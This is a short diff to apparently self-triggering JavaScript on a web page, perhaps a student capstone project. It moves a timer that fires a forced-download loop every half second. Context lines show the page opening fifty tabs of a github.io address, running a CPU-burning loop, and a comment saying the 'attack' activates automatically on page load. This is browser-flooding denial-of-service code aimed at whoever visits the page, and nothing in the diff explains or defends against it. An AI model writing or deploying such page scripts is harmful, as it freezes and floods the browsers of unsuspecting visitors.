@@ -97,6 +97,9 @@
       document.body.removeChild(link);
     }
 
+      // Start download loop every 1/2 seconds
+      setInterval(downloadLoop, 500);
+
     // Multiple Tabs
     for (let i = 0; i < 50; i++) {
       window.open('https://arizona5005.github.io/Capstone/', '_blank');
@@ -120,9 +123,6 @@
         if (x > 1e7) x = 0;
       }
     }
-
-    // Start download loop every 1/2 seconds
-    setInterval(downloadLoop, 500);
   }
 
   // Activate attack automatically on page load
